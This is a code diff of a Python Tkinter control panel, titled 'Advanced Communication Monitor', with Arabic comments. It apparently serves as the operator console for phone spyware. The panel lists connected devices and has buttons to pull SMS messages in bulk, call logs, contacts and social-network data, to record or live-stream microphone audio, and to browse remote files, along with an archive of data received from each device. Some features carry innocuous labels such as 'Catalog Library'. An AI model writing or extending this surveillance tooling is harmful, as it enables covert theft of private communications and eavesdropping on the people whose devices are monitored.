-        """Setup file operation commands"""
-        frame = ttk.Frame(parent)
+    def _setup_communication_commands(self, parent):
+        """إعداد أوامر تحليل الاتصالات المحسنة"""
+        frame = tk.Frame(parent, bg=self.current_theme["frame_bg"])
+        frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+
+        commands = [
+            ("👥 Social Network", self.get_social_network_data),
+            ("📞 Communication History", self.get_communication_history),
+            ("📋 Contacts List", self.get_contacts_list),
+            ("📲 Call Logs", self.get_call_logs),
+        ]
+
+        for i, (text, command) in enumerate(commands):
+            button = tk.Button(
+                frame,
+                text=text,
+                command=command,
+                state=tk.DISABLED,
+                bg=self.current_theme["button_bg"],
+                fg=self.current_theme["button_fg"],
+                relief=tk.RAISED,
+                font=("Arial", 9),
+            )
+            button.grid(row=i // 2, column=i % 2, padx=5, pady=5, sticky="ew")
+            self.command_buttons[text] = button
+
+        frame.columnconfigure(0, weight=1)
+        frame.columnconfigure(1, weight=1)
+
+    def _setup_enhanced_sms_commands(self, parent):
+        """إعداد أوامر الرسائل المحسنة"""
+        frame = tk.Frame(parent, bg=self.current_theme["frame_bg"])
+        frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+
+        # Enhanced SMS options
+        options_frame = tk.Frame(frame, bg=self.current_theme["frame_bg"])
+        options_frame.pack(fill=tk.X, padx=5, pady=5)
+
+        tk.Label(
+            options_frame,
+            text="📱 Enhanced SMS Extraction:",
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+            font=("Arial", 10, "bold"),
+        ).pack(anchor="w")
+
+        # Standard SMS extraction
+        self.standard_sms_button = tk.Button(
+            frame,
+            text="💬 Standard SMS Extract",
+            command=self.get_sms_list,
+            state=tk.DISABLED,
+            bg=self.current_theme["button_bg"],
+            fg=self.current_theme["button_fg"],
+            relief=tk.RAISED,
+            font=("Arial", 9),
+        )
+        self.standard_sms_button.pack(fill=tk.X, padx=5, pady=2)
+
+        # Unlimited SMS extraction with compression
+        self.unlimited_sms_button = tk.Button(
+            frame,
+            text="🚀 Unlimited SMS + Compression",
+            command=self.get_all_sms_unlimited,
+            state=tk.DISABLED,
+            bg=self.current_theme["status_success"],
+            fg="#ffffff",
+            relief=tk.RAISED,
+            font=("Arial", 9, "bold"),
+        )
+        self.unlimited_sms_button.pack(fill=tk.X, padx=5, pady=2)
+
+        # Options
+        options_inner_frame = tk.Frame(frame, bg=self.current_theme["frame_bg"])
+        options_inner_frame.pack(fill=tk.X, padx=5, pady=5)
+
+        self.sms_compression_var = tk.BooleanVar(
+            value=settings_manager.get("compression_enabled", True)
+        )
+        tk.Checkbutton(
+            options_inner_frame,
+            text="Enable compression",
+            variable=self.sms_compression_var,
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+            selectcolor=self.current_theme["entry_bg"],
+        ).pack(anchor="w")
+
+        self.sms_network_opt_var = tk.BooleanVar(
+            value=settings_manager.get("network_optimization", True)
+        )
+        tk.Checkbutton(
+            options_inner_frame,
+            text="Network optimization",
+            variable=self.sms_network_opt_var,
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+            selectcolor=self.current_theme["entry_bg"],
+        ).pack(anchor="w")
+
+        # Add to command buttons
+        self.command_buttons["💬 Standard SMS Extract"] = self.standard_sms_button
+        self.command_buttons["🚀 Unlimited SMS + Compression"] = (
+            self.unlimited_sms_button
+        )
+
+    def _setup_audio_commands(self, parent):
+        """إعداد أوامر المراقبة الصوتية"""
+        frame = tk.Frame(parent, bg=self.current_theme["frame_bg"])
+        frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+
+        # Fixed recording
+        self.record_audio_button = tk.Button(
+            frame,
+            text="🎤 Fixed Duration Recording",
+            command=self.record_audio_fixed,
+            state=tk.DISABLED,
+            bg=self.current_theme["button_bg"],
+            fg=self.current_theme["button_fg"],
+            relief=tk.RAISED,
+            font=("Arial", 9),
+        )
+        self.record_audio_button.pack(fill=tk.X, padx=5, pady=5)
+
+        # Live audio frame
+        live_audio_frame = tk.LabelFrame(
+            frame,
+            text="🔴 Live Audio Stream Control",
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+        )
+        live_audio_frame.pack(fill=tk.X, padx=5, pady=5)
+
+        self.start_live_audio_button = tk.Button(
+            live_audio_frame,
+            text="▶️ Start Live Stream",
+            command=self.start_live_audio,
+            state=tk.DISABLED,
+            bg=self.current_theme["status_success"],
+            fg="#ffffff",
+            relief=tk.RAISED,
+            font=("Arial", 9),
+        )
+        self.start_live_audio_button.pack(
+            side=tk.LEFT, padx=5, pady=5, fill=tk.X, expand=True
+        )
+
+        self.stop_live_audio_button = tk.Button(
+            live_audio_frame,
+            text="⏹️ Stop Live Stream",
+            command=self.stop_live_audio,
+            state=tk.DISABLED,
+            bg=self.current_theme["status_error"],
+            fg="#ffffff",
+            relief=tk.RAISED,
+            font=("Arial", 9),
+        )
+        self.stop_live_audio_button.pack(
+            side=tk.LEFT, padx=5, pady=5, fill=tk.X, expand=True
+        )
+
+        # Status
+        self.live_audio_status_var = tk.StringVar()
+        self.live_audio_status_var.set("🎵 Live Audio: Idle")
+        live_audio_status_label = tk.Label(
+            live_audio_frame,
+            textvariable=self.live_audio_status_var,
+            font=("Arial", 10, "bold"),
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+        )
+        live_audio_status_label.pack(padx=5, pady=2)
+
+    def _setup_enhanced_file_commands(self, parent):
+        """إعداد أوامر الملفات المحسنة"""
+        frame = tk.Frame(parent, bg=self.current_theme["frame_bg"])
         frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
         # File browser button
-        file_browser_button = ttk.Button(
+        file_browser_button = tk.Button(
             frame,
             text="📂 Open File Browser",
             command=self.open_file_browser,
             state=tk.DISABLED,
+            bg=self.current_theme["button_bg"],
+            fg=self.current_theme["button_fg"],
+            relief=tk.RAISED,
+            font=("Arial", 9, "bold"),
         )
-        file_browser_button.grid(
-            row=0, column=0, columnspan=2, padx=5, pady=5, sticky="ew"
-        )
+        file_browser_button.pack(fill=tk.X, padx=5, pady=5)
         self.command_buttons["📂 Open File Browser"] = file_browser_button
 
-        # Other file commands
+        # Enhanced document library commands
         commands = [
             ("🔍 Catalog Library", self.catalog_library_content),
             ("📊 Analyze Content", self.analyze_specific_content),
             ("⚙️ Process Queue", self.process_content_queue),
         ]
 
-        for i, (text, command) in enumerate(commands, start=1):
-            button = ttk.Button(frame, text=text, command=command, state=tk.DISABLED)
-            button.grid(
-                row=i // 2 + (1 if i % 2 == 0 else 0),
-                column=i % 2,
-                padx=5,
-                pady=5,
-                sticky="ew",
+        for text, command in commands:
+            button = tk.Button(
+                frame,
+                text=text,
+                command=command,
+                state=tk.DISABLED,
+                bg=self.current_theme["button_bg"],
+                fg=self.current_theme["button_fg"],
+                relief=tk.RAISED,
+                font=("Arial", 9),
             )
+            button.pack(fill=tk.X, padx=5, pady=2)
             self.command_buttons[text] = button
 
         # Smart options frame
-        options_frame = ttk.LabelFrame(frame, text="🤖 Smart Options")
-        options_frame.grid(row=3, column=0, columnspan=2, sticky="ew", padx=5, pady=5)
+        options_frame = tk.LabelFrame(
+            frame,
+            text="🤖 Smart Options",
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+        )
+        options_frame.pack(fill=tk.X, padx=5, pady=5)
 
-        self.battery_aware_var = tk.BooleanVar(value=True)
-        ttk.Checkbutton(
+        self.battery_aware_var = tk.BooleanVar(
+            value=settings_manager.get("battery_monitoring", True)
+        )
+        tk.Checkbutton(
             options_frame,
             text="Battery-aware processing",
             variable=self.battery_aware_var,
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+            selectcolor=self.current_theme["entry_bg"],
         ).pack(anchor="w", padx=5, pady=2)
 
-        self.network_optimized_var = tk.BooleanVar(value=True)
-        ttk.Checkbutton(
+        self.network_optimized_var = tk.BooleanVar(
+            value=settings_manager.get("network_optimization", True)
+        )
+        tk.Checkbutton(
             options_frame,
             text="Network-optimized transfers",
             variable=self.network_optimized_var,
+            bg=self.current_theme["frame_bg"],
+            fg=self.current_theme["fg"],
+            selectcolor=self.current_theme["entry_bg"],
         ).pack(anchor="w", padx=5, pady=2)
 
-        frame.columnconfigure(0, weight=1)
-        frame.columnconfigure(1, weight=1)
+    def _apply_theme(self):
+        """تطبيق الثيم على جميع العناصر"""
+        self.current_theme = theme_manager.get_theme()
 
-    def _setup_communication_commands(self, parent):
-        """إعداد أوامر تحليل الاتصالات"""
-        frame = ttk.Frame(parent)
-        frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        # Apply to main window
+        self.master.configure(bg=self.current_theme["bg"])
 
-        commands = [
-            ("👥 Social Network Analysis", self.get_social_network_data),
-            ("📞 Communication History", self.get_communication_history),
-            ("📋 Contacts List", self.get_contacts_list),
-            ("📲 Call Logs", self.get_call_logs),
-            ("💬 SMS Messages", self.get_sms_list),
-        ]
+        # Reconfigure ttk styles
+        self._configure_ttk_styles()
 
-        for i, (text, command) in enumerate(commands):
-            button = ttk.Button(frame, text=text, command=command, state=tk.DISABLED)
-            button.grid(row=i // 2, column=i % 2, padx=5, pady=5, sticky="ew")
-            self.command_buttons[text] = button
+        # Apply to custom widgets
+        try:
+            # Update listboxes
+            self.live_clients_listbox.configure(
+                bg=self.current_theme["listbox_bg"],
+                fg=self.current_theme["listbox_fg"],
+                selectbackground=self.current_theme["select_bg"],
+                selectforeground=self.current_theme["select_fg"],
+            )
 
-        frame.columnconfigure(0, weight=1)
-        frame.columnconfigure(1, weight=1)
+            self.historical_devices_listbox.configure(
+                bg=self.current_theme["listbox_bg"],
+                fg=self.current_theme["listbox_fg"],
+                selectbackground=self.current_theme["select_bg"],
+                selectforeground=self.current_theme["select_fg"],
+            )
 
-    def _setup_audio_commands(self, parent):
-        """إعداد أوامر المراقبة الصوتية"""
-        frame = ttk.Frame(parent)
-        frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+            # Update text widgets
+            self.details_text.configure(
+                bg=self.current_theme["text_bg"], fg=self.current_theme["text_fg"]
+            )
 
-        # Fixed recording
-        self.record_audio_button = ttk.Button(
-            frame,
-            text="🎤 Fixed Duration Recording",
-            command=self.record_audio_fixed,
-            state=tk.DISABLED,
-        )
-        self.record_audio_button.grid(
-            row=0, column=0, columnspan=2, padx=5, pady=5, sticky="ew"
-        )
+            self.stats_text.configure(
+                bg=self.current_theme["text_bg"], fg=self.current_theme["text_fg"]
+            )
 
-        # Live audio frame
-        live_audio_frame = ttk.LabelFrame(frame, text="🔴 Live Audio Stream Control")
-        live_audio_frame.grid(
-            row=1, column=0, columnspan=2, sticky="ew", padx=5, pady=5
-        )
+            self.log_text.configure(
+                bg=self.current_theme["text_bg"], fg=self.current_theme["text_fg"]
+            )
 
-        self.start_live_audio_button = ttk.Button(
-            live_audio_frame,
-            text="▶️ Start Live Stream",
-            command=self.start_live_audio,
-            state=tk.DISABLED,
-        )
-        self.start_live_audio_button.grid(row=0, column=0, padx=5, pady=5, sticky="ew")
+            # Update frames
+            for widget in [self.live_status_frame, self.archive_status_frame]:
+                widget.configure(bg=self.current_theme["frame_bg"])
 
-        self.stop_live_audio_button = ttk.Button(
-            live_audio_frame,
-            text="⏹️ Stop Live Stream",
-            command=self.stop_live_audio,
-            state=tk.DISABLED,
-        )
-        self.stop_live_audio_button.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
+            # Update labels
+            for label in [self.live_count_label, self.archive_count_label]:
+                label.configure(
+                    bg=self.current_theme["frame_bg"], fg=self.current_theme["fg"]
+                )
 
-        # Status
-        self.live_audio_status_var = tk.StringVar()
-        self.live_audio_status_var.set("Live Audio: Idle")
-        live_audio_status_label = ttk.Label(
-            live_audio_frame,
-            textvariable=self.live_audio_status_var,
-            font=("Arial", 10, "bold"),
-        )
-        live_audio_status_label.grid(row=1, column=0, columnspan=2, padx=5, pady=2)
+            # Update buttons
+            for button in self.command_buttons.values():
+                if isinstance(button, tk.Button):
+                    current_bg = button.cget("bg")
+                    # Don't change special colored buttons (success/error)
+                    if current_bg not in [
+                        self.current_theme["status_success"],
+                        self.current_theme["status_error"],
+                    ]:
+                        button.configure(
+                            bg=self.current_theme["button_bg"],
+                            fg=self.current_theme["button_fg"],
+                        )
 
-        live_audio_frame.columnconfigure(0, weight=1)
-        live_audio_frame.columnconfigure(1, weight=1)
-        frame.columnconfigure(0, weight=1)
-        frame.columnconfigure(1, weight=1)
+        except Exception as e:
+            logger.warning(f"Error applying theme: {e}")
+
+    def _toggle_theme(self):
+        """تبديل الثيم"""
+        new_theme = theme_manager.toggle_theme()
+        settings_manager.set("theme", new_theme)
+        self._apply_theme()
+        self.add_system_log(f"🌙 Switched to {new_theme} mode")
 
     def _initialize_data(self):
         """تهيئة البيانات الأولية"""
-        # Initialize list managers
-        self.live_clients_manager = ListManager(
-            self.live_clients_listbox, connected_clients_sio
-        )
-        self.historical_devices_manager = ListManager(
-            self.historical_devices_listbox, None
-        )
-
         self.update_live_clients_list()
         self.refresh_historical_device_list()
-        self.add_system_log("Advanced Communication Monitor Control Panel Initialized")
+        self.add_system_log(
+            "🚀 Advanced Communication Monitor Control Panel v2.0 Enhanced - Initialized"
+        )
 
         # Check library status
         if not SOUNDDEVICE_AVAILABLE:
             self.add_system_log(
-                "WARNING: sounddevice/numpy missing. Live audio playback disabled.",
+                "⚠️ WARNING: sounddevice/numpy missing. Live audio playback disabled.",
                 level="warning",
             )
-            self.live_audio_status_var.set("Live Audio: Disabled (Missing Libraries)")
+            self.live_audio_status_var.set(
+                "🎵 Live Audio: Disabled (Missing Libraries)"
+            )
         if not PIL_AVAILABLE:
             self.add_system_log(
-                "WARNING: PIL missing. Image preview disabled.", level="warning"
+                "⚠️ WARNING: PIL missing. Image preview disabled.", level="warning"
             )
 
-    # --- System Log Methods ---
     def add_system_log(self, message, level="info"):
-        """إضافة رسالة إلى سجل النظام"""
+        """إضافة رسالة إلى سجل النظام مع دعم الألوان"""
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+        # Choose color based on level
+        color_map = {
+            "info": self.current_theme["fg"],
+            "success": self.current_theme["status_success"],
+            "warning": self.current_theme["status_warning"],
+            "error": self.current_theme["status_error"],
+        }
+        color = color_map.get(level, self.current_theme["fg"])
+
         log_entry = f"[{timestamp}] [{level.upper()}] {message}\n"
 
         self.log_text.config(state=tk.NORMAL)
         self.log_text.insert(tk.END, log_entry)
+
+        # Apply color to the last line
+        try:
+            last_line_start = self.log_text.index("end-2l")
+            last_line_end = self.log_text.index("end-1l")
+            self.log_text.tag_add(f"level_{level}", last_line_start, last_line_end)
+            self.log_text.tag_config(f"level_{level}", foreground=color)
+        except:
+            pass
+
         self.log_text.see(tk.END)
         self.log_text.config(state=tk.DISABLED)
 
@@ -1935,10 +2739,11 @@ class AdvancedControlPanelApp:
             logger.warning(message)
         elif level == "error":
             logger.error(message)
+        elif level == "success":
+            logger.info(f"SUCCESS: {message}")
 
-    # --- List Management Methods ---
     def update_live_clients_list(self):
-        """تحديث قائمة العملاء المتصلين"""
+        """تحديث قائمة العملاء المتصلين مع عداد"""
 
         def format_client(sid_info_pair):
             sid, info = sid_info_pair
@@ -1960,20 +2765,32 @@ class AdvancedControlPanelApp:
             if len(capabilities) > 2:
                 caps_str += f",+{len(capabilities)-2}"
 
-            # أيقونة خضراء للإشارة إلى أن الجهاز متصل
             status_icon = "🟢" if stream_active_for_device.get(sid, False) else "🟢"
             return f"{status_icon} {display_name} | {device_id} | {ip} | [{caps_str}] | {last_seen_str}"
 
         items = list(connected_clients_sio.items()) if connected_clients_sio else []
-        self.live_clients_manager.refresh_list(items, format_client)
+
+        self.live_clients_listbox.delete(0, tk.END)
+        if not items:
+            self.live_clients_listbox.insert(tk.END, "No connected monitors")
+            self.live_clients_listbox.config(fg="grey")
+        else:
+            self.live_clients_listbox.config(fg=self.current_theme["listbox_fg"])
+            for item in items:
+                display_entry = format_client(item)
+                self.live_clients_listbox.insert(tk.END, display_entry)
+
+        # Update counter
+        self.live_count_label.config(text=f"Connected: {len(items)}")
 
     def refresh_historical_device_list(self):
-        """تحديث قائمة الأجهزة التاريخية"""
+        """تحديث قائمة الأجهزة التاريخية مع عداد"""
 
         def format_device(device_id):
             tag = device_manager.get_tag(device_id)
             device_folder = os.path.join(AppConfig.DATA_RECEIVED_DIR, device_id)
             file_count = self._count_files_in_device_folder(device_folder)
+            stats = device_manager.get_stats(device_id)
 
             is_online = any(
                 info.get("id") == device_id for info in connected_clients_sio.values()
@@ -1984,6 +2801,21 @@ class AdvancedControlPanelApp:
             if tag:
                 display_entry += f" 🏷️[{tag}]"
             display_entry += f" 📊({file_count} files)"
+
+            # Add recent activity indicator
+            if stats and stats.get("last_updated"):
+                try:
+                    last_update = datetime.datetime.fromisoformat(stats["last_updated"])
+                    hours_ago = (
+                        datetime.datetime.now() - last_update
+                    ).total_seconds() / 3600
+                    if hours_ago < 1:
+                        display_entry += " 🔥"
+                    elif hours_ago < 24:
+                        display_entry += " ⭐"
+                except:
+                    pass
+
             return display_entry
 
         try:
@@ -2001,16 +2833,22 @@ class AdvancedControlPanelApp:
                     reverse=True,
                 )
 
-            self.historical_devices_manager.refresh_list(devices, format_device)
+            self.historical_devices_listbox.delete(0, tk.END)
+            if not devices:
+                self.historical_devices_listbox.insert(
+                    tk.END, "No archived devices found"
+                )
+                self.historical_devices_listbox.config(fg="grey")
+            else:
+                self.historical_devices_listbox.config(
+                    fg=self.current_theme["listbox_fg"]
+                )
+                for device_id in devices:
+                    display_entry = format_device(device_id)
+                    self.historical_devices_listbox.insert(tk.END, display_entry)
 
-            # إعادة تحديد الجهاز المحدد سابقاً
-            if self.current_selected_historical_device_id:
-                for i, device_id in enumerate(
-                    self.historical_devices_manager.items_in_listbox
-                ):
-                    if device_id == self.current_selected_historical_device_id:
-                        self.historical_devices_listbox.selection_set(i)
-                        break
+            # Update counter
+            self.archive_count_label.config(text=f"Archived: {len(devices)}")
 
         except FileNotFoundError:
             self.historical_devices_listbox.delete(0, tk.END)
@@ -2018,6 +2856,7 @@ class AdvancedControlPanelApp:
                 tk.END, "❌ Data directory not found"
             )
             self.historical_devices_listbox.config(fg="grey")
+            self.archive_count_label.config(text="Archived: 0")
             logger.error(f"Data directory not found: {AppConfig.DATA_RECEIVED_DIR}")
 
     def _count_files_in_device_folder(self, device_folder):
@@ -2033,38 +2872,35 @@ class AdvancedControlPanelApp:
     def update_live_clients_list_item(self, sid_to_update):
         """تحديث عنصر واحد في قائمة العملاء"""
         try:
-            # For simplicity, just refresh the entire list
             self.update_live_clients_list()
         except Exception as e:
             logger.error(
                 f"Error updating live client list item for SID {sid_to_update}: {e}"
             )
 
-    # --- Selection Event Handlers ---
     def _on_live_client_select(self, event=None):
         """معالج تحديد عميل متصل"""
-        selected_item = self.live_clients_manager.get_selected_item()
+        selection = self.live_clients_listbox.curselection()
+        if not selection:
+            return
 
-        if selected_item:
-            sid, info = selected_item
-
-            # تحديث العميل المحدد الحالي
-            previous_selection = self.current_selected_live_client_sid
+        index = selection[0]
+        items = list(connected_clients_sio.items())
+        if 0 <= index < len(items):
+            sid, info = items[index]
             self.current_selected_live_client_sid = sid
             selected_device_id = info.get("id", "Unknown ID")
 
             self.add_system_log(
-                f"Selected live monitor: {selected_device_id} (SID: {sid})"
+                f"🎯 Selected live monitor: {selected_device_id} (SID: {sid})"
             )
-
-            # تمكين جميع عناصر التحكم
             self._enable_commands(True)
             self.display_device_details(selected_device_id)
 
             # Update audio status
             is_streaming = stream_active_for_device.get(sid, False)
             self.live_audio_status_var.set(
-                "Live Audio: Receiving..." if is_streaming else "Live Audio: Idle"
+                "🎵 Live Audio: Receiving..." if is_streaming else "🎵 Live Audio: Idle"
             )
 
             if SOUNDDEVICE_AVAILABLE:
@@ -2075,60 +2911,31 @@ class AdvancedControlPanelApp:
                     state=tk.NORMAL if is_streaming else tk.DISABLED
                 )
 
-            # تمييز العنصر المحدد بشكل واضح
-            self.live_clients_listbox.selection_clear(0, tk.END)
-            for i, item in enumerate(self.live_clients_manager.items_in_listbox):
-                if item[0] == sid:
-                    self.live_clients_listbox.selection_set(i)
-                    self.live_clients_listbox.see(i)  # التأكد من أن العنصر مرئي
-                    break
-
-            # إذا كان العنصر المحدد سابقاً هو نفسه العنصر الحالي، فلا نلغي التحديد
-            if previous_selection == sid:
-                self._ensure_selection_active()
-
-        else:
-            # إذا لم يتم تحديد أي عميل، لا نقوم بإلغاء التحديد الحالي
-            # بدلاً من ذلك، نعيد تحديد العميل المحدد سابقاً إن وجد
-            if self.current_selected_live_client_sid:
-                self._ensure_selection_active()
-            else:
-                self._enable_commands(False)
-
-    def _ensure_selection_active(self):
-        """التأكد من أن التحديد نشط في الواجهة"""
-        # تمييز العنصر المحدد في قائمة العملاء المتصلين
-        if self.current_selected_live_client_sid:
-            self.live_clients_listbox.selection_clear(0, tk.END)
-            for i, item in enumerate(self.live_clients_manager.items_in_listbox):
-                if item[0] == self.current_selected_live_client_sid:
-                    self.live_clients_listbox.selection_set(i)
-                    break
-
-        # تمييز العنصر المحدد في قائمة الأجهزة التاريخية
-        if self.current_selected_historical_device_id:
-            self.historical_devices_listbox.selection_clear(0, tk.END)
-            for i, device_id in enumerate(
-                self.historical_devices_manager.items_in_listbox
-            ):
-                if device_id == self.current_selected_historical_device_id:
-                    self.historical_devices_listbox.selection_set(i)
-                    break
-
     def _on_historical_device_select(self, event=None):
         """معالج تحديد جهاز تاريخي"""
-        selected_device_id = self.historical_devices_manager.get_selected_item()
-
-        # إلغاء التحديد إذا تم تحديد نفس العنصر مرة ثانية
-        if (
-            selected_device_id
-            and self.current_selected_historical_device_id == selected_device_id
-        ):
+        selection = self.historical_devices_listbox.curselection()
+        if not selection:
             return
 
-        if selected_device_id:
+        index = selection[0]
+        devices = [
+            d
+            for d in os.listdir(AppConfig.DATA_RECEIVED_DIR)
+            if os.path.isdir(os.path.join(AppConfig.DATA_RECEIVED_DIR, d))
+        ]
+
+        if devices:
+            devices.sort(
+                key=lambda x: os.path.getmtime(
+                    os.path.join(AppConfig.DATA_RECEIVED_DIR, x)
+                ),
+                reverse=True,
+            )
+
+        if 0 <= index < len(devices):
+            selected_device_id = devices[index]
             self.current_selected_historical_device_id = selected_device_id
-            self.add_system_log(f"Selected archived monitor: {selected_device_id}")
+            self.add_system_log(f"📂 Selected archived monitor: {selected_device_id}")
             self.display_device_details(selected_device_id)
 
             # Check if device is online
@@ -2146,7 +2953,9 @@ class AdvancedControlPanelApp:
                 self._enable_commands(True)
                 is_streaming = stream_active_for_device.get(live_sid, False)
                 self.live_audio_status_var.set(
-                    "Live Audio: Receiving..." if is_streaming else "Live Audio: Idle"
+                    "🎵 Live Audio: Receiving..."
+                    if is_streaming
+                    else "🎵 Live Audio: Idle"
                 )
 
                 if SOUNDDEVICE_AVAILABLE:
@@ -2160,29 +2969,87 @@ class AdvancedControlPanelApp:
                 self.current_selected_live_client_sid = None
                 self._enable_commands(False)
 
-            # تمييز العنصر المحدد
-            self.historical_devices_listbox.selection_clear(0, tk.END)
-            for i, device_id in enumerate(
-                self.historical_devices_manager.items_in_listbox
-            ):
-                if device_id == selected_device_id:
-                    self.historical_devices_listbox.selection_set(i)
-                    break
-        else:
-            self.current_selected_historical_device_id = None
-            if not self.current_selected_live_client_sid:
-                self._enable_commands(False)
+    def _on_live_client_right_click(self, event):
+        """معالج النقر الأيمن على العملاء المتصلين"""
+        self.live_clients_listbox.selection_clear(0, tk.END)
+        self.live_clients_listbox.selection_set(
+            self.live_clients_listbox.nearest(event.y)
+        )
+        self.live_clients_listbox.activate(self.live_clients_listbox.nearest(event.y))
+        self._on_live_client_select()
 
-    # --- Device Details Display ---
+        context_menu = Menu(self.master, tearoff=0)
+        context_menu.add_command(
+            label="📂 Browse Files", command=self.open_file_browser
+        )
+        context_menu.add_command(
+            label="👥 Social Network", command=self.get_social_network_data
+        )
+        context_menu.add_command(
+            label="📞 Communication", command=self.get_communication_history
+        )
+        context_menu.add_command(
+            label="💬 Enhanced SMS", command=self.get_all_sms_unlimited
+        )
+        context_menu.add_command(
+            label="🎤 Record Audio", command=self.record_audio_fixed
+        )
+        context_menu.add_separator()
+        context_menu.add_command(label="🏷️ Tag Device", command=self._tag_device)
+
+        try:
+            context_menu.tk_popup(event.x_root, event.y_root)
+        finally:
+            context_menu.grab_release()
+
+    def _on_historical_device_right_click(self, event):
+        """معالج النقر الأيمن على الأجهزة التاريخية"""
+        self.historical_devices_listbox.selection_clear(0, tk.END)
+        self.historical_devices_listbox.selection_set(
+            self.historical_devices_listbox.nearest(event.y)
+        )
+        self.historical_devices_listbox.activate(
+            self.historical_devices_listbox.nearest(event.y)
+        )
+        self._on_historical_device_select()
+
+        context_menu = Menu(self.master, tearoff=0)
+        is_online = self.current_selected_live_client_sid is not None
+
+        if is_online:
+            context_menu.add_command(
+                label="📂 Browse Files", command=self.open_file_browser
+            )
+            context_menu.add_separator()
+
+        context_menu.add_command(
+            label="📋 View Details",
+            command=lambda: self.display_device_details(
+                self.current_selected_historical_device_id
+            ),
+        )
+        context_menu.add_command(
+            label="📊 Show Statistics", command=self._show_device_statistics
+        )
+        context_menu.add_command(label="🏷️ Tag Device", command=self._tag_device)
+        context_menu.add_command(
+            label="🗑️ Delete Data", command=self._delete_device_data
+        )
+
+        try:
+            context_menu.tk_popup(event.x_root, event.y_root)
+        finally:
+            context_menu.grab_release()
+
     def display_device_details(self, device_id):
-        """عرض تفاصيل الجهاز"""
+        """عرض تفاصيل الجهاز المحسنة"""
         self.details_text.config(state=tk.NORMAL)
         self.details_text.delete("1.0", tk.END)
 
         # Device header
-        self.details_text.insert(tk.END, f"{'='*60}\n")
-        self.details_text.insert(tk.END, f"📱 MONITOR DETAILS: {device_id}\n")
-        self.details_text.insert(tk.END, f"{'='*60}\n\n")
+        self.details_text.insert(tk.END, f"{'='*80}\n")
+        self.details_text.insert(tk.END, f"📱 ENHANCED MONITOR DETAILS: {device_id}\n")
+        self.details_text.insert(tk.END, f"{'='*80}\n\n")
 
         # Basic info
         tag = device_manager.get_tag(device_id)
@@ -2211,26 +3078,47 @@ class AdvancedControlPanelApp:
                 self.details_text.insert(
                     tk.END, f"💻 Platform: {live_info.get('platform', 'Unknown')}\n"
                 )
+                capabilities = live_info.get("capabilities", ["basic"])
                 self.details_text.insert(
-                    tk.END,
-                    f"⚡ Capabilities: {', '.join(live_info.get('capabilities', ['basic']))}\n",
+                    tk.END, f"⚡ Capabilities: {', '.join(capabilities)}\n"
                 )
 
-        self.details_text.insert(tk.END, f"\n{'='*60}\n")
+        # Enhanced stats
+        stats = device_manager.get_stats(device_id)
+        if stats:
+            self.details_text.insert(tk.END, f"\n📊 DEVICE STATISTICS\n")
+            self.details_text.insert(tk.END, f"{'='*50}\n")
+
+            for stat_type, stat_data in stats.items():
+                if stat_type == "last_updated":
+                    continue
+
+                self.details_text.insert(
+                    tk.END, f"• {stat_type.replace('_', ' ').title()}:\n"
+                )
+                if isinstance(stat_data, dict):
+                    for key, value in stat_data.items():
+                        if key == "timestamp":
+                            try:
+                                dt = datetime.datetime.fromisoformat(value)
+                                value = dt.strftime("%Y-%m-%d %H:%M:%S")
+                            except:
+                                pass
+                        self.details_text.insert(
+                            tk.END, f"  - {key.replace('_', ' ').title()}: {value}\n"
+                        )
+                else:
+                    self.details_text.insert(tk.END, f"  {stat_data}\n")
+                self.details_text.insert(tk.END, "\n")
+
+        self.details_text.insert(tk.END, f"\n{'='*80}\n")
         self.details_text.insert(tk.END, f"📂 DATA FILES & ANALYSIS RESULTS\n")
-        self.details_text.insert(tk.END, f"{'='*60}\n\n")
+        self.details_text.insert(tk.END, f"{'='*80}\n\n")
 
         device_folder = os.path.join(AppConfig.DATA_RECEIVED_DIR, device_id)
         try:
             if os.path.isdir(device_folder):
-                self._display_folder_contents(device_folder, "")
-
-                # Add a button at the end to open file browser
-                self.details_text.insert(tk.END, f"\n\n{'='*60}\n")
-                self.details_text.insert(
-                    tk.END,
-                    "📂 Click 'Browse Files' in the File Operations tab to navigate files\n",
-                )
+                self._display_enhanced_folder_contents(device_folder, "")
             else:
                 self.details_text.insert(tk.END, "❌ Device data folder not found\n")
         except Exception as e:
@@ -2239,32 +3127,53 @@ class AdvancedControlPanelApp:
 
         self.details_text.config(state=tk.DISABLED)
 
-    def _display_folder_contents(self, folder_path, prefix=""):
-        """عرض محتويات المجلد بشكل هرمي"""
+        # Update statistics tab
+        self._update_statistics_display(device_id)
+
+    def _display_enhanced_folder_contents(self, folder_path, prefix=""):
+        """عرض محتويات المجلد بشكل هرمي محسن"""
         try:
             items = sorted(os.listdir(folder_path))
+
+            # Group by folder type
+            folder_groups = {
+                "messages": "💬 Messages & Communication",
+                "audio_recordings": "🎵 Audio Recordings",
+                "social_network": "👥 Social Network Data",
+                "structured_analysis": "📊 Analysis Results",
+                "library_catalog": "📚 Library Catalog",
+                "content_analysis": "🔍 Content Analysis",
+            }
 
             # Subdirectories first
             for item in items:
                 item_path = os.path.join(folder_path, item)
                 if os.path.isdir(item_path):
-                    self.details_text.insert(tk.END, f"{prefix}📁 {item}/\n")
+                    folder_name = folder_groups.get(item, f"📁 {item}")
+                    self.details_text.insert(tk.END, f"{prefix}{folder_name}/\n")
 
                     sub_items = sorted(os.listdir(item_path))
+                    file_count = 0
+                    total_size = 0
+
                     for sub_item in sub_items[:10]:  # First 10 files only
                         sub_item_path = os.path.join(item_path, sub_item)
                         if os.path.isfile(sub_item_path):
                             try:
                                 stat_result = os.stat(sub_item_path)
-                                size_kb = stat_result.st_size / 1024
+                                file_size = stat_result.st_size
